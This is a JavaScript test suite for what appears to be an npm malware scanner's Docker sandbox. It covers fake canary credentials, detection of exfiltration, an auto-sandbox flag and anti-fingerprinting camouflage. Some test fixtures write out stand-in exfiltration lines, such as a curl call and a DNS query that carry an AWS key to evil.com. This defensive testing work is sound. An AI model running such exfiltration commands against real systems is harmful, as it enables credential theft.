/**
 * Sandbox improvements tests (v2.10.2)
 * Chantier 1: Honey environment file generators
 * Chantier 2: Dynamic canary token generators (enhanced)
 * Chantier 3: Auto-sandbox CLI flag
 */
'use strict';

const fs = require('fs');
const os = require('os');
const path = require('path');
const { test, asyncTest, assert, assertIncludes, runScanDirect } = require('../test-utils');

function runSandboxImprovementTests() {
  console.log('\n=== SANDBOX IMPROVEMENTS TESTS ===\n');

  // ═══════════════════════════════════════════════════════════════
  // Chantier 2: Enhanced canary token generators
  // ═══════════════════════════════════════════════════════════════

  test('C2: generateCanaryTokens produces 8 unique tokens', () => {
    const { generateCanaryTokens } = require('../../src/canary-tokens.js');
    const { tokens } = generateCanaryTokens();
    assert(Object.keys(tokens).length === 8, `Expected 8 tokens, got ${Object.keys(tokens).length}`);
    assert(tokens.GITHUB_TOKEN.startsWith('ghp_'), 'GITHUB_TOKEN should start with ghp_');
    assert(tokens.NPM_TOKEN.startsWith('npm_'), 'NPM_TOKEN should start with npm_');
    assert(tokens.AWS_ACCESS_KEY_ID.startsWith('AKIA'), 'AWS key should start with AKIA');
    assert(tokens.GITLAB_TOKEN.startsWith('glpat-'), 'GITLAB_TOKEN should start with glpat-');
    assert(tokens.DOCKER_PASSWORD.startsWith('dckr_pat_'), 'DOCKER_PASSWORD should start with dckr_pat_');
  });

  test('C2: tokens are unique across sessions', () => {
    const { generateCanaryTokens } = require('../../src/canary-tokens.js');
    const { tokens: t1 } = generateCanaryTokens();
    const { tokens: t2 } = generateCanaryTokens();
    assert(t1.GITHUB_TOKEN !== t2.GITHUB_TOKEN, 'GITHUB_TOKEN should differ between sessions');
    assert(t1.AWS_ACCESS_KEY_ID !== t2.AWS_ACCESS_KEY_ID, 'AWS_ACCESS_KEY_ID should differ between sessions');
    assert(t1.NPM_TOKEN !== t2.NPM_TOKEN, 'NPM_TOKEN should differ between sessions');
  });

  test('C2: createCanaryEnvFile produces valid .env content', () => {
    const { generateCanaryTokens, createCanaryEnvFile } = require('../../src/canary-tokens.js');
    const { tokens } = generateCanaryTokens();
    const content = createCanaryEnvFile(tokens);
    assertIncludes(content, 'GITHUB_TOKEN=', '.env should contain GITHUB_TOKEN');
    assertIncludes(content, 'NPM_TOKEN=', '.env should contain NPM_TOKEN');
    assertIncludes(content, 'AWS_ACCESS_KEY_ID=', '.env should contain AWS_ACCESS_KEY_ID');
    assertIncludes(content, tokens.GITHUB_TOKEN, '.env should contain actual token value');
  });

  test('C2: createCanaryNpmrc produces valid .npmrc content', () => {
    const { generateCanaryTokens, createCanaryNpmrc } = require('../../src/canary-tokens.js');
    const { tokens } = generateCanaryTokens();
    const content = createCanaryNpmrc(tokens);
    assertIncludes(content, '//registry.npmjs.org/:_authToken=', '.npmrc should contain auth token');
    assertIncludes(content, tokens.NPM_AUTH_TOKEN, '.npmrc should contain NPM_AUTH_TOKEN value');
  });

  test('C2: createCanaryAwsCredentials produces valid INI content', () => {
    const { generateCanaryTokens, createCanaryAwsCredentials } = require('../../src/canary-tokens.js');
    const { tokens } = generateCanaryTokens();
    const content = createCanaryAwsCredentials(tokens);
    assertIncludes(content, '[default]', 'AWS creds should have [default] profile');
    assertIncludes(content, 'aws_access_key_id = ', 'AWS creds should contain access key');
    assertIncludes(content, 'aws_secret_access_key = ', 'AWS creds should contain secret key');
    assertIncludes(content, tokens.AWS_ACCESS_KEY_ID, 'AWS creds should contain actual key value');
    assertIncludes(content, 'region = us-east-1', 'AWS creds should contain region');
  });

  test('C2: createCanarySshKey produces valid PEM structure', () => {
    const { createCanarySshKey } = require('../../src/canary-tokens.js');
    const content = createCanarySshKey();
    assertIncludes(content, '-----BEGIN OPENSSH PRIVATE KEY-----', 'SSH key should have PEM header');
    assertIncludes(content, '-----END OPENSSH PRIVATE KEY-----', 'SSH key should have PEM footer');
    // Verify it has base64 content between headers
    const lines = content.split('\n');
    assert(lines.length >= 4, `SSH key should have at least 4 lines, got ${lines.length}`);
  });

  test('C2: createCanarySshKey is unique per call', () => {
    const { createCanarySshKey } = require('../../src/canary-tokens.js');
    const key1 = createCanarySshKey();
    const key2 = createCanarySshKey();
    assert(key1 !== key2, 'SSH keys should differ between calls');
  });

  test('C2: createCanaryGitconfig produces valid INI content', () => {
    const { createCanaryGitconfig } = require('../../src/canary-tokens.js');
    const content = createCanaryGitconfig();
    assertIncludes(content, '[user]', '.gitconfig should have [user] section');
    assertIncludes(content, 'name = ', '.gitconfig should have name');
    assertIncludes(content, 'email = ', '.gitconfig should have email');
    assertIncludes(content, '[credential]', '.gitconfig should have [credential] section');
    assertIncludes(content, 'helper = store', '.gitconfig should have credential helper');
  });

  // ═══════════════════════════════════════════════════════════════
  // Chantier 2: Canary exfiltration detection
  // ═══════════════════════════════════════════════════════════════

  test('C2: detectCanaryExfiltration finds tokens in HTTP bodies', () => {
    const { generateCanaryTokens, detectCanaryExfiltration } = require('../../src/canary-tokens.js');
    const { tokens } = generateCanaryTokens();
    const networkLogs = {
      http_bodies: [`{"token":"${tokens.GITHUB_TOKEN}"}`],
      http_requests: [],
      dns_queries: [],
      tls_connections: []
    };
    const result = detectCanaryExfiltration(networkLogs, tokens);
    assert(result.detected === true, 'Should detect token in HTTP body');
    assert(result.exfiltrations.length >= 1, 'Should have at least 1 exfiltration');
    assert(result.exfiltrations[0].token === 'GITHUB_TOKEN', 'Should identify GITHUB_TOKEN');
  });

  test('C2: detectCanaryExfiltration finds tokens in DNS queries', () => {
    const { generateCanaryTokens, detectCanaryExfiltration } = require('../../src/canary-tokens.js');
    const { tokens } = generateCanaryTokens();
    const networkLogs = {
      http_bodies: [],
      http_requests: [],
      dns_queries: [`${tokens.AWS_ACCESS_KEY_ID}.evil.com`],
      tls_connections: []
    };
    const result = detectCanaryExfiltration(networkLogs, tokens);
    assert(result.detected === true, 'Should detect token in DNS query');
  });

  test('C2: detectCanaryInOutput finds tokens in stdout', () => {
    const { generateCanaryTokens, detectCanaryInOutput } = require('../../src/canary-tokens.js');
    const { tokens } = generateCanaryTokens();
    const result = detectCanaryInOutput(`Sending: ${tokens.NPM_TOKEN}`, '', tokens);
    assert(result.detected === true, 'Should detect token in stdout');
    assert(result.exfiltrations[0].token === 'NPM_TOKEN', 'Should identify NPM_TOKEN');
  });

  test('C2: no false positives when no tokens match', () => {
    const { generateCanaryTokens, detectCanaryExfiltration } = require('../../src/canary-tokens.js');
    const { tokens } = generateCanaryTokens();
    const networkLogs = {
      http_bodies: ['{"data":"totally-benign-content"}'],
      http_requests: [],
      dns_queries: ['registry.npmjs.org'],
      tls_connections: []
    };
    const result = detectCanaryExfiltration(networkLogs, tokens);
    assert(result.detected === false, 'Should not detect tokens in benign traffic');
  });

  // ═══════════════════════════════════════════════════════════════
  // Chantier 1: Honey environment — sandbox index integration
  // ═══════════════════════════════════════════════════════════════

  test('C1: sandbox/index.js imports enhanced canary-tokens', () => {
    const sandboxSrc = fs.readFileSync(
      path.join(__dirname, '..', '..', 'src', 'sandbox', 'index.js'), 'utf8');
    assertIncludes(sandboxSrc, 'createCanaryAwsCredentials', 'Should import createCanaryAwsCredentials');
    assertIncludes(sandboxSrc, 'createCanarySshKey', 'Should import createCanarySshKey');
    assertIncludes(sandboxSrc, 'createCanaryGitconfig', 'Should import createCanaryGitconfig');
  });

  test('C1: sandbox/index.js passes AWS/SSH/gitconfig content as env vars', () => {
    const sandboxSrc = fs.readFileSync(
      path.join(__dirname, '..', '..', 'src', 'sandbox', 'index.js'), 'utf8');
    assertIncludes(sandboxSrc, 'CANARY_AWS_CONTENT', 'Should inject AWS credentials content');
    assertIncludes(sandboxSrc, 'CANARY_SSH_KEY', 'Should inject SSH key content');
    assertIncludes(sandboxSrc, 'CANARY_GITCONFIG', 'Should inject gitconfig content');
  });

  test('C1: sandbox-runner.sh writes honeypot files', () => {
    const runnerSrc = fs.readFileSync(
      path.join(__dirname, '..', '..', 'docker', 'sandbox-runner.sh'), 'utf8');
    assertIncludes(runnerSrc, 'HONEY_HOME="/home/sandboxuser"', 'Should define HONEY_HOME');
    assertIncludes(runnerSrc, '.env', 'Should write .env file');
    assertIncludes(runnerSrc, '.npmrc', 'Should write .npmrc file');
    assertIncludes(runnerSrc, '.aws/credentials', 'Should write AWS credentials');
    assertIncludes(runnerSrc, '.ssh/id_rsa', 'Should write SSH key');
    assertIncludes(runnerSrc, '.gitconfig', 'Should write .gitconfig');
  });

  test('C1: sandbox-runner.sh cleans up canary content env vars', () => {
    const runnerSrc = fs.readFileSync(
      path.join(__dirname, '..', '..', 'docker', 'sandbox-runner.sh'), 'utf8');
    assertIncludes(runnerSrc, 'unset CANARY_ENV_CONTENT CANARY_NPMRC_CONTENT CANARY_AWS_CONTENT CANARY_SSH_KEY CANARY_GITCONFIG',
      'Should unset all canary content env vars to prevent leakage');
  });

  test('C1: sandbox-runner.sh sets correct permissions on SSH key', () => {
    const runnerSrc = fs.readFileSync(
      path.join(__dirname, '..', '..', 'docker', 'sandbox-runner.sh'), 'utf8');
    assertIncludes(runnerSrc, 'chmod 600', 'SSH key should have 600 permissions (realistic)');
  });

  // ═══════════════════════════════════════════════════════════════
  // Chantier 1: Static canary token detection in sandbox scoring
  // ═══════════════════════════════════════════════════════════════

  test('C1: static canary detection finds tokens in network data', () => {
    const { detectStaticCanaryExfiltration, STATIC_CANARY_TOKENS } = require('../../src/sandbox/index.js');
    const report = {
      network: {
        http_bodies: [`data=${STATIC_CANARY_TOKENS.GITHUB_TOKEN}`],
        dns_queries: [],
        http_requests: [],
        tls_connections: []
      },
      filesystem: { created: [] },
      processes: { spawned: [] }
    };
    const exfils = detectStaticCanaryExfiltration(report);
    assert(exfils.length >= 1, 'Should detect static GITHUB_TOKEN in HTTP body');
    assert(exfils[0].token === 'GITHUB_TOKEN', 'Should identify GITHUB_TOKEN');
  });

  test('C1: static canary detection finds tokens in process output', () => {
    const { detectStaticCanaryExfiltration, STATIC_CANARY_TOKENS } = require('../../src/sandbox/index.js');
    const report = {
      network: { http_bodies: [], dns_queries: [], http_requests: [], tls_connections: [] },
      filesystem: { created: [] },
      processes: { spawned: [{ command: `curl https://evil.com?key=${STATIC_CANARY_TOKENS.AWS_ACCESS_KEY_ID}` }] },
      install_output: `Stolen: ${STATIC_CANARY_TOKENS.NPM_TOKEN}`
    };
    const exfils = detectStaticCanaryExfiltration(report);
    assert(exfils.length >= 2, `Should detect multiple static tokens, got ${exfils.length}`);
  });

  // ═══════════════════════════════════════════════════════════════
  // Chantier 3: Auto-sandbox CLI integration
  // ═══════════════════════════════════════════════════════════════

  test('C3: bin/muaddib.js supports --auto-sandbox flag', () => {
    const cliSrc = fs.readFileSync(
      path.join(__dirname, '..', '..', 'bin', 'muaddib.js'), 'utf8');
    assertIncludes(cliSrc, '--auto-sandbox', 'CLI should support --auto-sandbox flag');
    assertIncludes(cliSrc, 'autoSandbox', 'Should parse autoSandbox option');
  });

  test('C3: --auto-sandbox passed to run() options', () => {
    const cliSrc = fs.readFileSync(
      path.join(__dirname, '..', '..', 'bin', 'muaddib.js'), 'utf8');
    assertIncludes(cliSrc, 'autoSandbox: autoSandbox', 'Should pass autoSandbox to run()');
  });

  test('C3: index.js has auto-sandbox logic', () => {
    const indexSrc = fs.readFileSync(
      path.join(__dirname, '..', '..', 'src', 'index.js'), 'utf8');
    assertIncludes(indexSrc, 'options.autoSandbox', 'Should check autoSandbox option');
    assertIncludes(indexSrc, 'isDockerAvailable', 'Should check Docker availability');
    assertIncludes(indexSrc, 'buildSandboxImage', 'Should build sandbox image');
    assertIncludes(indexSrc, 'local: true', 'Should run sandbox in local mode');
  });

  test('C3: auto-sandbox uses preliminary score (not riskScore)', () => {
    const indexSrc = fs.readFileSync(
      path.join(__dirname, '..', '..', 'src', 'index.js'), 'utf8');
    assertIncludes(indexSrc, 'prelimScore', 'Should compute preliminary score');
    assertIncludes(indexSrc, 'prelimScore >= 20', 'Should trigger when prelimScore >= 20');
  });

  test('C3: auto-sandbox is graceful when Docker unavailable', () => {
    const indexSrc = fs.readFileSync(
      path.join(__dirname, '..', '..', 'src', 'index.js'), 'utf8');
    assertIncludes(indexSrc, 'Docker not available', 'Should log when Docker not available');
    assertIncludes(indexSrc, 'sandbox is best-effort', 'Should treat sandbox as best-effort');
  });

  // Auto-sandbox should NOT trigger for benign packages (score < 20)
  asyncTest('C3: auto-sandbox does not trigger for clean package', async () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-sb-clean-'));
    fs.writeFileSync(path.join(tmpDir, 'package.json'), JSON.stringify({ name: 'clean-pkg', version: '1.0.0' }));
    fs.writeFileSync(path.join(tmpDir, 'index.js'), 'console.log("hello world");\n');
    try {
      const r = await runScanDirect(tmpDir, { autoSandbox: true });
      // Should complete without sandbox (clean package, no Docker needed)
      assert(r.sandbox === null || r.sandbox === undefined, 'Clean package should not trigger sandbox');
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  // ═══════════════════════════════════════════════════════════════
  // Help text verification
  // ═══════════════════════════════════════════════════════════════

  test('C3: help text includes --auto-sandbox', () => {
    const cliSrc = fs.readFileSync(
      path.join(__dirname, '..', '..', 'bin', 'muaddib.js'), 'utf8');
    assertIncludes(cliSrc, 'Auto-trigger sandbox when static scan score >= 20',
      'Help text should describe --auto-sandbox');
  });

  // ═══════════════════════════════════════════════════════════════
  // Chantier 4: Docker camouflage — anti-sandbox evasion
  // ═══════════════════════════════════════════════════════════════

  test('C4: sandbox-runner.sh removes /.dockerenv', () => {
    const runnerSrc = fs.readFileSync(
      path.join(__dirname, '..', '..', 'docker', 'sandbox-runner.sh'), 'utf8');
    assertIncludes(runnerSrc, 'rm -f /.dockerenv',
      'Should remove /.dockerenv to evade Docker fingerprinting');
  });

  test('C4: sandbox-runner.sh writes .bash_history', () => {
    const runnerSrc = fs.readFileSync(
      path.join(__dirname, '..', '..', 'docker', 'sandbox-runner.sh'), 'utf8');
    assertIncludes(runnerSrc, '/home/sandboxuser/.bash_history',
      'Should write realistic .bash_history');
    assertIncludes(runnerSrc, 'git pull origin main',
      '.bash_history should contain realistic dev commands');
    assertIncludes(runnerSrc, 'npm install',
      '.bash_history should contain npm install');
  });

  test('C4: sandbox-runner.sh creates ~/projects/my-app/', () => {
    const runnerSrc = fs.readFileSync(
      path.join(__dirname, '..', '..', 'docker', 'sandbox-runner.sh'), 'utf8');
    assertIncludes(runnerSrc, 'mkdir -p /home/sandboxuser/projects/my-app',
      'Should create fake project directory');
    assertIncludes(runnerSrc, '/home/sandboxuser/projects/my-app/package.json',
      'Should create fake package.json in project dir');
  });

  test('C4: sandbox-runner.sh camouflage runs before Phase 1', () => {
    const runnerSrc = fs.readFileSync(
      path.join(__dirname, '..', '..', 'docker', 'sandbox-runner.sh'), 'utf8');
    const camouflageIdx = runnerSrc.indexOf('rm -f /.dockerenv');
    const phase1Idx = runnerSrc.indexOf('PHASE 1:');
    assert(camouflageIdx !== -1, 'Should have camouflage section');
    assert(phase1Idx !== -1, 'Should have Phase 1');
    assert(camouflageIdx < phase1Idx,
      'Camouflage (Phase 0.5) must run before Phase 1');
  });

  test('C4: preload.js intercepts /proc/1/cgroup', () => {
    const preloadSrc = fs.readFileSync(
      path.join(__dirname, '..', '..', 'docker', 'preload.js'), 'utf8');
    assertIncludes(preloadSrc, '/proc/1/cgroup',
      'Should intercept /proc/1/cgroup reads');
    assertIncludes(preloadSrc, 'init.scope',
      'Should return systemd init.scope (non-Docker content)');
  });

  test('C4: preload.js /proc/1/cgroup does not contain "docker"', () => {
    const preloadSrc = fs.readFileSync(
      path.join(__dirname, '..', '..', 'docker', 'preload.js'), 'utf8');
    // Extract the spoofed return value for /proc/1/cgroup
    const cgroupMatch = preloadSrc.match(/if \(p === '\/proc\/1\/cgroup'\)[\s\S]*?return '([^']+)'/);
    assert(cgroupMatch, 'Should have /proc/1/cgroup return statement');
    assert(!cgroupMatch[1].includes('docker'),
      'Spoofed cgroup content must NOT contain "docker"');
    assert(!cgroupMatch[1].includes('containerd'),
      'Spoofed cgroup content must NOT contain "containerd"');
  });

  test('C4: preload.js /proc/uptime interception still works (non-regression)', () => {
    const preloadSrc = fs.readFileSync(
      path.join(__dirname, '..', '..', 'docker', 'preload.js'), 'utf8');
    assertIncludes(preloadSrc, "if (p === '/proc/uptime')",
      'Should still intercept /proc/uptime');
    assertIncludes(preloadSrc, 'SPOOFED /proc/uptime',
      'Should log /proc/uptime spoofing');
  });

  test('C4: sandbox/index.js passes --hostname to Docker', () => {
    const sandboxSrc = fs.readFileSync(
      path.join(__dirname, '..', '..', 'src', 'sandbox', 'index.js'), 'utf8');
    assertIncludes(sandboxSrc, '--hostname=',
      'Should pass --hostname flag to Docker');
    assertIncludes(sandboxSrc, 'dev-laptop-',
      'Hostname should use dev-laptop- prefix');
  });

  test('C4: sandbox hostname is randomized per session', () => {
    const sandboxSrc = fs.readFileSync(
      path.join(__dirname, '..', '..', 'src', 'sandbox', 'index.js'), 'utf8');
    assertIncludes(sandboxSrc, 'crypto.randomBytes',
      'Hostname should use crypto.randomBytes for uniqueness');
    // Verify hostname format: dev-laptop-XXXX (4 hex chars from 2 random bytes)
    const hostnameMatch = sandboxSrc.match(/dev-laptop-\$\{crypto\.randomBytes\((\d+)\)/);
    assert(hostnameMatch, 'Should construct hostname with randomBytes');
    assert(parseInt(hostnameMatch[1]) >= 2,
      'Should use at least 2 random bytes for hostname suffix');
  });

  test('C4: hostname is not a bare hex hash (anti-fingerprint)', () => {
    // Verify the hostname pattern would not match Docker default (12 hex chars)
    const crypto = require('crypto');
    const hostname = `dev-laptop-${crypto.randomBytes(2).toString('hex')}`;
    assert(!(/^[0-9a-f]{12}$/.test(hostname)),
      'Hostname must not look like Docker default 12-char hex hash');
    assert(hostname.startsWith('dev-laptop-'),
      'Hostname should start with dev-laptop-');
    assert(hostname.length > 12,
      'Hostname should be longer than Docker default 12-char hash');
  });

  // ═══════════════════════════════════════════════════════════════
  // Chantier 5: Filesystem réalisme — home directory structure
  // ═══════════════════════════════════════════════════════════════

  test('C5: sandbox-runner.sh creates realistic home directories', () => {
    const runnerSrc = fs.readFileSync(
      path.join(__dirname, '..', '..', 'docker', 'sandbox-runner.sh'), 'utf8');
    const expectedDirs = ['.config', '.local/share', 'Downloads', 'Documents', '.vscode'];
    for (const dir of expectedDirs) {
      assertIncludes(runnerSrc, dir,
        `Should create ~/${dir} for realistic home structure`);
    }
  });

  test('C5: home directories are owned by sandboxuser', () => {
    const runnerSrc = fs.readFileSync(
      path.join(__dirname, '..', '..', 'docker', 'sandbox-runner.sh'), 'utf8');
    // Verify chown covers the new directories (may be split across continuation lines)
    assertIncludes(runnerSrc, 'chown -R sandboxuser:sandboxuser /home/sandboxuser/.config',
      'Should chown .config to sandboxuser');
    assertIncludes(runnerSrc, '/home/sandboxuser/.local',
      'Should chown .local to sandboxuser');
    assertIncludes(runnerSrc, '/home/sandboxuser/Downloads',
      'Should chown Downloads to sandboxuser');
  });
}

module.exports = { runSandboxImprovementTests };
